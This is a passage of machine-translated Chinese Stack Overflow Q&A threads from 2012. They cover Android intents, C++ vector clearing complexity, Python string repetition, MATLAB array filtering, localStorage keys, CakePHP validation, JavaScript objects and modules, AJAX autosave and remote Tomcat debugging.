                    android:layout_height="wrap_content"
                    android:layout_weight="50"
                    android:gravity="center"
                    android:src="@drawable/skilt130" />
            </LinearLayout>
        </LinearLayout>
    </ScrollView>

</LinearLayout> 
```

在同一布局中，imageview 可以更改。只是不是在发送到主布局上的图像视图时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:23:38.333

如果这就是您的意思，您不应该在活动之间发送图像。您可能可以这样做，但是通过类似[intent](http://developer.android.com/reference/android/content/Intent.html)的方式肯定会很慢。据我了解，您想转到 Activity B，然后单击 ImageButton，然后返回到 Activity A 并将其显示在 ImageView 中。难道你不能通过意图（即作为字符串）传递图像的*路径吗？*或者，您可以将名称作为字符串传递，然后通过在 Activity A 中设置 ImageView 的源，在下一个 Activity 中显示该图像。

如果图像是临时创建的，并且您需要传递它，则可以将其保存到私有文件（MODE_PRIVATE），然后在下一个活动中访问它。

对不起，如果我在想一些题外话。

**编辑**

查看[此](https://stackoverflow.com/questions/4352172/how-do-you-pass-images-bitmaps-between-android-activities-using-bundles)内容以获取更多信息。

**编辑 2**

您可以使用意图在活动之间传递字符串：（即图像路径/名称）

```
String myImageName = "image1";
Intent picIntent = new Intent(this, NextActivity.class);
picIntent.putExtra("name", myImageName); //this has to correspond to the below name
startActivity(intent); 
```

您可以在下一个活动中检索它：

```
String thePictureName = getIntent().getStringExtra("name"); //correspond to above name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T00:14:15.007

你的问题是这个

```
VælgMax = (ImageView) findViewById(R.id.ivValgtMax); 
```

`ivValgtMax`不是中定义的 id，`fartlayout`因此该代码将为您提供`null`. 我假设`ivValgtMax`是指`ImageView`来自另一个布局的。

如果我理解正确，您想从另一个 Activity A （具有 main `ImageView`）启动 Activity B （具有图像），在 Activity B 中选择一个图像，并在用户拥有后将所选图像返回给 Activity A点击。

如果这一切都是正确的，我们可以继续。您想从 A 启动 Activity B 的方式是使用类似

```
Intent intent = new Intent(this, ActivityB.class);    
startActivityForResult(intent, IMAGE_SELECTION_VALUE); 
```

where`IMAGE_SELECTION_VALUE`是您分配整数的静态值，只需使其具有唯一性。

在 Activity B 中，一旦用户完成点击，您的目标就是将选择返回给 Activity A。为此，您需要创建一个意图并设置结果。

```
public void onClick(View v) {
    ... your code ...
    Intent resultIntent = new Intent(null);
    resultIntent.putExtra(IMAGE_FIELD_NAME, userSelection);
    setResult(Activity.RESULT_OK, resultIntent);
    finish();
} 
```

在上面的代码中，`IMAGE_FIELD_NAME`将是一个静态`String`图像，您可以使用它来找到正确的图像（我们将在下一步中找到如何使用它）。`userSelection`将是您发送回活动 A 的数据。您可以使用`v.getId()`它并将您的 switch 语句移动到活动 A。

最后，您将希望`onActivityResult`在 Activity A 中覆盖。这将允许您从 Activity B 获取结果，这也是我们将使用`IMAGE_FIELD_NAME`.

```
public void onActivityResult(int requestCode, int resultCode, Intent data) {     
    super.onActivityResult(requestCode, resultCode, data); 
    switch(requestCode) { 
        case IMAGE_SELECTION_VALUE:
            if (resultCode == Activity.RESULT_OK) { 
                int imageId = data.getIntExtra(IMAGE_FIELD_NAME);
                // now you can update your ImageView here
            }
            break; 

        default: 
            break;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T23:05:49.260

您不会将 ImageView 从一种布局发送到另一种布局。你也可以，

1.  删除布局上的 ImageView 并添加到另一个布局（通过膨胀）。
2.  在第一个布局上隐藏并在其他布局上显示。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T23:31:49.757

1.  `i`为_`FartSelector`
2.  `startActivity(i);`
3.  创建一个 OnActivityResult(int result_code) 并检查 FartSelector 的代码
4.  在放屁选择器中，在点击时使用所需的图像数据打包一个新意图
5.  调用`setResult(newIntent);`并`finish();`在创建和打包意图之后
6.  从我们在 3 处中断的地方开始，解压缩意图并在您的 ImageView 中使用它。

# vector - std::vector 的复杂度是多少 ::clear() 当 T 是原始类型时？

> ID：11235975
> 
> 赞同：14
> 
> 时间：2012-06-27T23:03:11.083
> 
> 标签：vector, complexity-theory, unordered-map, primitive

我知道 clear() 操作的复杂性与容器的大小成线性关系，因为必须调用析构函数。但是原始类型（和 POD）呢？似乎最好的办法是将向量大小设置为 0，以便复杂度保持不变。

如果这是可能的，std::unordered_map 也可以吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-20T19:35:43.667

> 似乎最好的办法是将向量大小设置为 0，以便复杂度保持不变。

[通常，将向量的大小调整为零](http://www.cplusplus.com/reference/stl/vector/resize/)的复杂性与当前存储在`vector`. 因此，将`vector`的大小设置为零比跟注没有任何优势`clear()`——两者本质上是相同的。

但是，至少一个实现（libstdc++，source in [`bits/stl_vector.h`](https://gcc.gnu.org/onlinedocs/libstdc++/latest-doxygen/a00182_source.html)）通过使用部分模板特化为原始类型提供了 O(1) 复杂度。

的实现`clear()`导航到`std::_Destroy(from, to)`函数 in [`bits/stl_construct.h`](https://gcc.gnu.org/onlinedocs/libstdc++/latest-doxygen/a00530_source.html)，该函数执行非平凡的编译时优化：它声明了一个辅助模板类`_Destroy_aux`，其模板参数类型为`bool`。该类对 有*部分特化*和`true`对 的*显式特*化`false`。两种特化都定义了一个名为`__destroy`. 如果模板参数为`true`，则函数体为空；如果参数是`false`，则[主体包含一个循环`T`](https://gcc.gnu.org/onlinedocs/libstdc++/latest-doxygen/a00530_source.html)，通过[调用](https://gcc.gnu.org/onlinedocs/libstdc++/latest-doxygen/a00530_source.html)`std::_Destroy(ptr)`.

诀窍出现在[第 136 行](https://gcc.gnu.org/onlinedocs/libstdc++/latest-doxygen/a00530_source.html)：

```
std::_Destroy_aux<__has_trivial_destructor(_Value_type)>::
__destroy(__first, __last); 
```

辅助类根据`__has_trivial_destructor`检查结果实例化。检查器返回`true`内置类型以及`false`具有非平凡析构函数的类型。结果，对 、 和其他 POD 类型的调用变为无`__destroy`操作。`int``double`

`std::unordered_map`不同之处`vector`在于它可能需要删除代表 POD 对象的“哈希桶”的结构，而不是删除对象本身^*。`clear`to的优化`O(1)`是可能的，但它在很大程度上取决于实现，所以我不会指望它。

* * *

^*确切答案取决于实现：基于开放寻址（线性探测、二次探测等）实现[*冲突解决*](http://en.wikipedia.org/wiki/Hash_table#Collision_resolution)的哈希表可能能够删除`O(1)`; 但是，基于单独链接的实现必须一个接一个地删除存储桶。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T23:33:27.530

`std::_Destroy`最终被 使用的gcc 版本会`clear()`尝试根据类型是否具有微不足道的析构函数进行模板化，因此在这种情况下，即使没有优化通过，复杂度也是恒定的。但是我不知道模板的效果如何。

# python - 在终端或python中打印x个字符？

> ID：11235979
> 
> 赞同：0
> 
> 时间：2012-06-27T23:03:44.987
> 
> 标签：python, linux

如果我需要 x 数量的字符来测试我的程序，有没有办法在 linux 中使用终端快速生成它们？还是在python中？例如，我想测试当我输入 80 个字符时我的程序是否中断。但我不想写 80 个字符，而是希望能够在终端中生成 80 个字符，然后将其复制粘贴到我的程序（或管道等）。我试着做：

```
>>> for item in range (1,80):
...     print "x", 
```

它可以工作，但它打印 x 之间有超过 80 个字符的空格

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T23:04:59.083

在 Python 中，乘法运算符`*`可以应用于字符串。

```
print "x" * 80 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T23:08:28.097

在外壳上，您可以滥用`seq`：

```
% seq -f foo -s '' 10
foofoofoofoofoofoofoofoofoofoo 
```

如果您希望字符串用换行符分隔，使用`yes`最简单：

```
% yes
y
y
y
...
% yes foo
foo
foo
foo
...
% yes twice | head -2
twice
twice 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-28T00:30:43.923

它必须是'x'吗？对于随机字符串，您可以在 shell 中使用它

```
$ dd if=/dev/urandom count=80 bs=1 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T23:08:26.043

试试这个：

```
print "x" * 80 
```

或者

```
print "".join([str(x) for x in xrange(80)]) 
```

这将生成长列表

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-28T01:18:28.413

你可以在一个字符上使用 * 操作符来重复它 80 次。所以只需制作一个名为“out.py”的小文件，其中包含该行

```
print 'x' * 80 
```

然后写

```
$ python out.py | python prgm.py 
```

在终端中 prgm.py 是你的 python 程序的名称

# arrays - 将值限制在数组中的范围内

> ID：11235981
> 
> 赞同：1
> 
> 时间：2012-06-27T23:04:13.653
> 
> 标签：arrays, matlab, octave

我可以将数组限制为小于或大于使用单个值的值，但是如何将值数组限制在特定范围内。

下面的示例代码片段：

```
arrayphase_sort=sortrows(arrayphase,4); %sort by phase in deg low to high
arrayphase_sort_limit_idx=arrayphase_sort(:,4)<45;% idx to limit array to phase angles under 45 degree
arrayphase_sort_limit=arrayphase_sort(arrayphase_sort_limit_idx,:); %limit array to phase angles under 45 degree 
```

但我尝试添加 &>10 以查看是否可以让数组显示大于 10 且小于 45 的所有内容，例如：（但出现错误）

```
arrayphase_sort_limit_idx=arrayphase_sort(:,4)<45**&>10**; 
```

我知道这是一个语法问题，但我不确定语法是否正确。任何想法正确的语法来完成我正在尝试做的事情。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T23:20:48.023

你这样做：

```
A = round(180 * rand(10, 10))
A(A > 10 & A < 45) 
```

第一行生成一个 10x10 的随机数据矩阵，第二行提取 10 到 45 之间的数字。

# javascript - 每页的LocalStorage而不是（子）域？

> ID：11235983
> 
> 赞同：3
> 
> 时间：2012-06-27T23:04:54.310
> 
> 标签：javascript, local-storage

localStorage 是每个域/子域的，但我需要存储和检索每页的值。

有没有人有从该位置删除域、书签和查询字符串的表达式？然后我可以使用 encodeURIComponent 并在每个 localStorage-key 前面加上这个值。

在这种情况下，我还需要对该表达式进行“反转”，以便仅检索当前页面的值。编辑我不认为我需要一个“反向”功能——它会是同一个表达式。

如果我有上面的两个表达式，你会使用这个（剥离的）位置作为单个键条目，并将其中的页面所需的所有值字符串化吗？这可能更可取，因为我可以只检查一次位置以发现它是否有任何相应的 localStorage。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T23:08:17.550

我有一个函数可以根据页面名称（从 window.location 获取）为我生成一个密钥，并附加密钥*本来的*内容，然后我将数据存储在本地存储中。

```
function findPageName() {
    var path = window.location.pathname,
        s = path.split('/'),
        l = s.length,
        k = path.length,
        aux = 0;

    if (s[l - 1]) {
        return s[l - 1];
    } else if (l) { // l will always be a min of 2 (try '/'.split('/') )
        return s[l - 2];
    } else if (k == 0) {
        return '/'; //you likely want to replace this with another value
    } else {
        return s[1];
    }
}

function getKey(key) {
    return getPageName() + key;
} 
```

# cakephp - CakePHP 在控制器中验证来自关联模型的数据

> ID：11235988
> 
> 赞同：1
> 
> 时间：2012-06-27T23:05:12.330
> 
> 标签：cakephp, cakephp-2.1, cakephp-model

您好，基本上我有两个模型：**User**和**Profile**。每个用户**都有**一个配置文件。

因此，当我提交表单时，它应该验证如下：

```
/* UsersController.php */

...

if ($this->request -> isPost()) {
    $this->loadModel('Profile'); //By some reason I have to use loadModel, even if I include it on App::uses
    $this->Profile->set( $this->request->data );
    $validates = $this->Profile->validateAssociated($this->request->data['Profile']);

    if($validates){
        //do kinky stuff
    } else {
        //cry
    } 
```

`$validate`我在 bake 中生成的 Profile Model 上定义了规则。

我尝试了不同的方法，但没有成功：

```
 $this->Profile->set( $this->request->data );
    if($this->Profile->validates()){
        //do kinky stuff
    } else {
        //cry
    } 
```

每次它直奔并抛出一个 SQL 错误。

有任何想法吗？我错过了什么吗？

***编辑：***

这是验证规则（我重新烘焙了规则以确保它们的格式正确）：

```
public $validate = array(
    'twitter' => array(
        'custom' => array(
            'rule'  => array('custom','([A-Za-z0-9_]+)'),
            'message'  => 'S&oacute;lo son admitidos letras, n&uacute;meros y guiones al piso'
        ),
    ),
    'facebook_id' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Ingrese su nombre en Facebook'
        ),
    ),
    'country_id' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione un pa&iacute;s'
        ),
    ),
    'state_id' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione un departamento'
        ),
    ),
    'city_id' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione una ciudad'
        ),
    ),
    'barrio' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Ingrese un barrio'
        ),
    ),
    'direccion' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Ingrese una direcci&oacute;n'
        ),
    ),
    'telefono' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Ingrese un tel&eacute;fono'
        ),
        'numeric' => array(
            'rule' => array('numeric'),
            'message' => 'S&oacute;lo se admiten n&uacute;meros.'
        ),
    ),
    'celular' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Ingrese un celular'
        ),
        'numeric' => array(
            'rule' => array('numeric'),
            'message' => 'S&oacute;lo se admiten n&uacute;meros.'
        ),
    ),
    'nacimiento' => array(
        'date' => array(
            'rule' => array('date'),
            'message' => 'Ingrese una fecha de nacimiento v&aacute;lida.'
        ),
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Ingrese una fecha de nacimiento.'
        ),
    ),
    'sexo' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione sexo'
        ),
    ),
    'estado_civil' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione estado civil'
        ),
    ),
    'estrato' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione estrato'
        ),
    ),
    'estudio_id' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione nivel de estudios'
        ),
    ),
    'ocupacion_id' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione ocupaci&oacute;n'
        ),
    ),
    'personas_casa' => array(
        'comparison' => array(
            'rule' => array('comparison', '>', 0),
            'message' => 'Seleccione el n&uacute;mero de personas en la casa'
        ),
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione el n&uacute;mero de personas en la casa'
        ),
    ),
    'referred_by' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione c&oacute;mo se enter&oacute; de la Comunidad Talk'
        ),
    ),
    'referrer' => array(
        'notempty' => array(
            'rule' => array('notempty'),
            'message' => 'Seleccione c&oacute;mo se enter&oacute; de la Comunidad Talk'
        ),
    ),
); 
```

和错误（它表明验证被跳过）：

```
Error: SQLSTATE[23000]: Integrity constraint violation: 1048 Column 'country_id' cannot be null

SQL Query: INSERT INTO `newTalk`.`profiles` (`user_id`, `twitter`, `facebook_id`, `country_id`, `state_id`, `city_id`, `barrio`, `direccion`, `codigo_postal`, `telefono`, `celular`, `nacimiento`, `sexo`, `estado_civil`, `estrato`, `estudio_id`, `ocupacion_id`, `personas_casa`, `referred_by`, `modified`, `created`) VALUES (2, '', '', NULL, NULL, NULL, '', '', '', '', '', NULL, '0', 0, 0, 0, 0, 0, NULL, '2012-06-28 12:56:07', '2012-06-28 12:56:07') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T07:33:17.987

我猜你的表单已经发布了用户和个人资料数据。

在第二个示例中，您使用了错误的 set() 格式。

形成手册

```
<?php
$this->Post->read(null, 1);
$this->Post->set(array(
    'title' => 'New title',
    'published' => false
));
$this->Post->save();
?> 
```

你可以试试：

```
$this->Profile->set($this->request->data["Profile"])
if($this->Profile->validates()) {
    ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T07:22:58.867

如果您要验证关联的模型数据，请记住一件小事。然后所有相关字段都应包含在该模型命名数组中。

# javascript - 为什么我不能在 Javascript 中的另一个对象初始化程序中拥有一个对象初始化程序？

> ID：11235990
> 
> 赞同：1
> 
> 时间：2012-06-27T23:05:42.733
> 
> 标签：javascript

我有以下代码，想知道为什么不允许我在另一个对象中创建另一个对象。

**代码**

```
//Object initializer
    var shoe = {
            size: 10,
            make: var maketype = {
                this.brand: "rebook"
            },
            availability: "now"
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T23:06:56.353

你可以很好地做到这一点。这`var maketype =`是非法的（并且也是`this`属性名称的一部分）。

这有效：

```
var shoe = {
        size: 10,
        make: {
            brand: "rebook"
        },
        availability: "now"
    } 
```

如果要保留对 的单独引用`make`，可以这样做：

```
var maketype = { brand: "reebok" },
    shoe = {
        size: 10,
        make: maketype,
        availability: "now"
    } 
```

# javascript - Javascript 模块模式、嵌套函数和子模块

> ID：11235991
> 
> 赞同：5
> 
> 时间：2012-06-27T23:05:45.043
> 
> 标签：javascript, module

我试图将我的头包裹在 javascript 模块上，但我不确定如何将一个模块拆分为更多的子模块。我读过嵌套函数并不是一个好主意，由于性能原因，那么如何分解模块中的函数呢？例如，假设我有以下模块：

```
var Editor = {};

Editor.build = (function () {
    var x = 100;
    return {
        bigFunction: function () {
            // This is where I need to define a couple smaller functions 
            // should I create a new module for bigFunction? If so, should it be nested in Editor.build somehow?
        }
    };
})(); 
```

bigFunction 仅与 Editor.build 相关。我应该将构成 bigFunction 的较小函数附加到原型 bigFunction 对象吗？我什至不确定这是否有意义。

```
var Editor = {};

Editor.build = (function () {
    var x = 100;
    return {
        bigFunction: function () {
            bigFunction.smallFunction();
            bigFunction.prototype.smallFunction = function(){ /*do something */ };   
            // not sure if this even makes sense
        }
    };
})(); 
```

有人可以在这里把我扔到正确的方向吗？网上有太多误导性的信息，希望有一个关于如何处理这种模块化的明确指南。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:20:38.773

这是我用来为输入命名的片段：

```
 var dynamicCounter = 0;
    //custom dropdown names
    var createContainerNames = function () {
        function Names() {
            this.id = "Tasks_" + dynamicCounter + "__ContainerId";
            this.name = "Tasks[" + dynamicCounter + "].ContainerId";
            this.parent = "task" + dynamicCounter + "Container";
        }
        Names.prototype = { constructor: Names };
        return function () { return new Names(); };
    } (); 
```

然后我使用它：

```
 var createdNames = createContainerNames();
    var createdId = createdNames.id;
    dynamicCounter++;
    var differentNames = createContainerNames();
    var differentId = differentNames.id; 
```

另一种方法是这样做：

```
var NameModule = function(){

 //"private" namemodule variables
 var priv1 = "Hello";

 //"private namemodule methods
 function privMethod1(){
  //TODO: implement
 }

 //"public namemodule variables
 var pub1 = "Welcome";

 //"public" namemodule methods
 function PubMethod(){
  //TODO: pub
 } 

 return {
  pub1 : pub1,
  PubMethod: PubMethod
 }; 
```

然后使用它

```
var myPubMethod = new NameModule();
myPubMethod.PubMethod();
var pubVar = myPubMethod.pub1; 
```

**编辑**

您也可以采用这种方法：

```
var mod = function(){
 this.modArray = [];
};

mod.prototype = {

 //private variables
 modId: null,

 //public method
 AddToArray: function (obj) {
    this.modArray.push(obj);
 }
} 
```

# php - 创建可以实时更新的数据库

> ID：11235995
> 
> 赞同：1
> 
> 时间：2012-06-27T23:06:40.783
> 
> 标签：php

这很难解释，但我会尝试。

我们经营一家拥有 QC 计划的汽车商店。该程序是在 access97 中编码的，是时候升级了，我们选择尝试使用 PHP/MySQL 方法来执行此操作。

现在，访问软件的表单有几个页面，每个框都会实时发送到数据库，所以当你输入一些东西时，你不必点击保存按钮或下一步或任何东西，当你回来时它就在那里。

此外，表单由自动递增的作业编号驱动，您可以将其打入页面顶部的字段中，它会查询服务器并在表单框中显示所有数据，以便您对其进行编辑。

我什至不知道如何开始这个项目。我得到了一个工作表格和一个 insert.php 页面，但我不知道如何处理其余部分。

如果我能得到一个正确方向的指针，那将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T23:14:48.320

你只是想让它自动保存？您将不得不研究 JavaScript，更具体地说是 AJAX。我推荐使用 jQuery 库。基本上，每次修改表单字段时，您都会想要进行一次 AJAX 调用，并且该 AJAX 调用只会特别更新一个字段。

我了解您可能对网站设计非常陌生，所以这对您来说可能很复杂。

我会通读[这个 W3Schools 教程。](http://w3schools.com/jquery/default.asp)读完之后，我会密切关注[本教程](http://w3schools.com/jquery/ajax_post.asp)。

同样，**这对初学者来说很难**。我建议您继续编写脚本，并随着时间的推移在 StackOverflow 上提出更具体的问题。祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T23:11:56.147

您需要将数据作为 ajax 请求提交。这样就可以发送和返回数据，而无需重新加载页面来更新信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-29T04:52:28.357

我在这里创建了一个简单的示例：

**HTML/JS:** [shaquin.tk/experiments/ajax.html](http://shaquin.tk/experiments/ajax.html) ,

**PHP：** [shaquin.tk/experiments/qc.txt](http://shaquin.tk/experiments/qc.txt)。

查看源代码以了解它是如何工作的（我的代码中也有一些注释），随意复制它并根据自己的需要进行修改。

总结一下它的工作原理：

*   在文本框中输入文本时，会更新已更改元素的列表。
*   每*updateInterval*毫秒（默认为 1000），检查列表。（这有助于减少流量和延迟。）如果有任何更改，则调用 PHP 文件来更新数据库，并清除列表。
*   如果一个元素失去焦点并且它发生了变化（例如复制/粘贴），则调用 PHP 文件。
*   PHP 文件清理查询，检查有效的工作编号，并更新数据库。

参考：

[AJAX XMLHttpRequest](http://www.w3schools.com/ajax/ajax_xmlhttprequest_send.asp)

[设置间隔](https://developer.mozilla.org/en/DOM/window.setInterval)

[添加事件监听器](https://developer.mozilla.org/en/DOM/element.addEventListener)

[encodeURI](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/encodeURI) [mysqli_connect](http://php.net/manual/en/mysqli.construct.php)

[mysqli_query](http://php.net/manual/en/mysqli.query.php)

[mysqli_real_escape_string](http://php.net/manual/en/mysqli.real-escape-string.php)

# eclipse - Eclipse 中的远程 Tomcat 7 调试问题

> ID：11235998
> 
> 赞同：1
> 
> 时间：2012-06-27T23:06:47.167
> 
> 标签：eclipse, debugging, tomcat, jpda

我能够在 Eclipse 中创建一个简单的 Web 项目，它有一个简单的 HelloWorld servlet。我可以使用本地 Tomcat（在 index.jsp 或 servlet 中设置断点）很好地调试它，当我尝试示例 URL 时它会着陆：

```
http://localhost:8080/RemoteDebugTest/HelloWorld 
```

但是，当我尝试对远程 java 应用程序使用 Eclipse 调试配置时，我能够连接并查看服务器线程，但我的应用程序没有部署，并且 URL 看起来好像从未部署过 Web 模块。（上面相同的 URL 有 404 错误。）帮助我 StackOverflow，你是我唯一的希望。

我尝试过的事情：

将 JPDA_ADDRESS 等环境变量设置为 8000，将 JPDA_TRANSPORT 设置为 dt_socket。在 catalina.sh（在远程 linux Tomcat7 服务器上）或 catalina.bat 中设置它们 使用 jpda run 或 jpda start 运行 catalina 启动脚本

我已经广泛搜索了在线资源，除了一篇简单推荐 Jetty 的文章之外，似乎没有其他人有这个问题。（我来自使用 WAS 从未遇到过问题的背景。）

其他信息：

操作系统：Windows 7（64 位）Tomcat 7.0.0.28 MyEclipse 10（基于 Eclipse 3.7.2）